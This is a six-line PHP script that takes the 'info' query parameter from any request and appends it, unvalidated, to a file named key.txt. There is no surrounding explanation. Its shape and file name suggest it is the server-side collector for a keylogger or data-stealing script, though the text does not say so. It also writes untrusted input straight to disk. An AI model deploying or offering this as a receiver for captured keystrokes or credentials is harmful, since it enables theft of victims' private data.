<?php
$info = $_GET['info'];
$file = fopen("key.txt", "a");
fwrite($file, $info."". PHP_EOL);
fclose($file);
?>